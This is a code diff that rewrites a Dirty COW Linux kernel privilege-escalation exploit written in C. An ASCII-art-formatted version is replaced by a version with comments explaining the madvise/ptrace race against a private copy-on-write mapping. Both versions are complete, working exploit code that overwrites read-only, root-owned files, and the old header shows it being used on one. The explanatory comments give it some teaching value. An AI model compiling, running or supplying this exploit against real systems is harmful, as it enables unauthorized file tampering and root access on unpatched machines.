@@ -1,72 +1,137 @@
-// $ echo pikachu|sudo tee pokeball;ls -l pokeball;gcc -pthread pokemon.c -o d;./d pokeball miltank;cat pokeball
-#include <fcntl.h>                        //// pikachu
-#include <pthread.h>                      //// -rw-r--r-- 1 root root 8 Apr 4 12:34 pokeball
-#include <string.h>                       //// pokeball
-#include <stdio.h>                        ////    (___)
-#include <stdint.h>                       ////    (o o)_____/
-#include <sys/mman.h>                     ////     @@ `     \ 
-#include <sys/types.h>                    ////      \ ____, /miltank
-#include <sys/stat.h>                     ////      //    //
-#include <sys/wait.h>                     ////     ^^    ^^
-#include <sys/ptrace.h>                   //// mmap bc757000
-#include <unistd.h>                       //// madvise 0
-////////////////////////////////////////////// ptrace 0
-////////////////////////////////////////////// miltank
-//////////////////////////////////////////////
-int f                                      ;// file descriptor
-void *map                                  ;// memory map
-pid_t pid                                  ;// process id
-pthread_t pth                              ;// thread
-struct stat st                             ;// file info
-//////////////////////////////////////////////
-void *madviseThread(void *arg)             {// madvise thread
-  int i,c=0                                ;// counters
-  for(i=0;i<200000000;i++)//////////////////// loop to 2*10**8
-    c+=madvise(map,100,MADV_DONTNEED)      ;// race condition
-  printf("madvise %d\n\n",c)               ;// sum of errors
-                                           }// /madvise thread
-//////////////////////////////////////////////
-int main(int argc,char *argv[])            {// entrypoint
-  if(argc<3)return 1                       ;// ./d file contents
-  printf("%s                               \n\
-   (___)                                   \n\
-   (o o)_____/                             \n\
-    @@ `     \\                            \n\
-     \\ ____, /%s                          \n\
-     //    //                              \n\
-    ^^    ^^                               \n\
-", argv[1], argv[2])                       ;// dirty cow
-  f=open(argv[1],O_RDONLY)                 ;// open read only file
-  fstat(f,&st)                             ;// stat the fd
-  map=mmap(NULL                            ,// mmap the file
-           st.st_size+sizeof(long)         ,// size is filesize plus padding
-           PROT_READ                       ,// read-only
-           MAP_PRIVATE                     ,// private mapping for cow
-           f                               ,// file descriptor
-           0)                              ;// zero
-  printf("mmap %lx\n\n",(unsigned long)map);// sum of error code
-  pid=fork()                               ;// fork process
-  if(pid)                                  {// if parent
-    waitpid(pid,NULL,0)                    ;// wait for child
-    int u,i,o,c=0,l=strlen(argv[2])        ;// util vars (l=length)
-    for(i=0;i<10000/l;i++)//////////////////// loop to 10K divided by l
-      for(o=0;o<l;o++)//////////////////////// repeat for each byte
-        for(u=0;u<10000;u++)////////////////// try 10K times each time
-          c+=ptrace(PTRACE_POKETEXT        ,// inject into memory
-                    pid                    ,// process id
-                    map+o                  ,// address
-                    *((long*)(argv[2]+o))) ;// value
-    printf("ptrace %d\n\n",c)              ;// sum of error code
-                                           }// otherwise
-  else                                     {// child
-    pthread_create(&pth                    ,// create new thread
-                   NULL                    ,// null
-                   madviseThread           ,// run madviseThred
-                   NULL)                   ;// null
-    ptrace(PTRACE_TRACEME)                 ;// stat ptrace on child
-    kill(getpid(),SIGSTOP)                 ;// signal parent
-    pthread_join(pth,NULL)                 ;// wait for thread
-                                           }// / child
-  return 0                                 ;// return
-                                           }// / entrypoint
-//////////////////////////////////////////////
+// gcc -pthread exploit.c -o exploit
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <unistd.h>
+
+int f;                  // file descriptor
+void *map;              // memory map
+pid_t pid;              // process id
+pthread_t pth;          // thread
+struct stat st;         // file_info
+
+void *madviseThread(void *arg)
+{
+        int i, c = 0;
+
+        /*
+         * MADV_DONTNEED flag informs kernel that memory in the given range
+         * (from the first parameter to the second one) will not be accessed
+         * in the near future.
+         *
+         * After a successful MADV_DONTNEED operation, the semantics of memory
+         * access in the specified region are changed. Subsequent accessses of
+         * pages in the range will succeed, but will result in either:
+         *
+         *      - Repopulating the memory contents from the up-to-date contents
+         *        of the underlying mapped file
+         *      - zero-fill-on-demand pages for anonymous private mappings
+         */
+
+        for(i = 0; i < 200000000; i++)
+                c += madvise(map, 100, MADV_DONTNEED);
+	printf("madvise %d\n\n",c);
+}
+
+int main(int argc, char *argv[])
+{
+        if (argc < 3)
+                return 1;
+
+        f = open(argv[1], O_RDONLY);
+        fstat(f, &st);  // retrieve file information
+
+        // map opened file with MAP_PRIVATE
+        map = mmap(
+                NULL,
+                st.st_size + sizeof(long),
+                PROT_READ,
+                MAP_PRIVATE, f, 0);
+
+        /*
+         * MAP_PRIVATE flag creates a private copy-on-write mapping.
+         * Updates to this mapping are not visible to other processes that
+         * use the same file, and are not applied to the underlying file.
+         */
+
+        printf("mmap %lx\n\n", (unsigned long) map);
+
+        /*
+         * fork() creates a new process by duplicating the calling process.
+         * pid thus refers to the process id of child process.
+         *
+         * On success, the PID of the child process is returned in the parent,
+         * and 0 is returned in the child. On failure, -1 is returned in the
+         * parent, no child process is created.
+         *
+         * The technique used here resembles recursion.
+         */
+
+	pid = fork();
+
+        if(pid) {
+
+                /*
+                 * waitpid() system call suspends execution of the calling process
+                 * until a child specified by pid argument has changed state.
+                 *
+                 * When the third argument is 0, the calling process waits for
+                 * any child process whose process group ID is equal to that of
+                 * the calling process.
+                 *
+                 * In short, it waits for the child process.
+                 */
+
+                waitpid(pid, NULL, 0);
+
+                int u, i, o, c = 0;
+                int l = strlen(argv[2]);        // length of string argument
+
+		// loop below keeps writing to the COW mapping of read-only file
+                for(i = 0; i < 10000/l; i++) {
+                        for(o = 0; o < l; o++) {
+                                for(u = 0; u < 10000; u++) {
+		/*
+		 * PTRACE_POKETEXT copies data at the address pointed by the
+		 * fourth argument to the address pointed by the third
+		 * arguement (map + o).
+		 */
+                                        c += ptrace(
+                                                PTRACE_POKETEXT,
+                                                pid,
+                                                map + o,
+                                                *((long*)(argv[2]+o)));
+                                }
+                        }
+                }
+                printf("ptrace %d\n\n",c);
+        } else {
+		// loop that keeps reading the COW mapping of read-only file
+                pthread_create(&pth, NULL, madviseThread, NULL);
+
+                /*
+                 * ptrace() system call provides a means by which one process
+                 * may observe and control the execution of another process,
+                 * and examine and change the tracee's memory and registers.
+		 *
+		 * PTRACE_TRACEME indicates that this process is to be traced
+		 * by its parent.
+		 *
+		 * Parent and child processes run concurrently.
+		 */
+
+		ptrace(PTRACE_TRACEME);
+                kill(getpid(), SIGSTOP);	// stop the child process
+                pthread_join(pth, NULL);	// wait for madviseThread to terminate
+        }
+
+        return 0;
+}
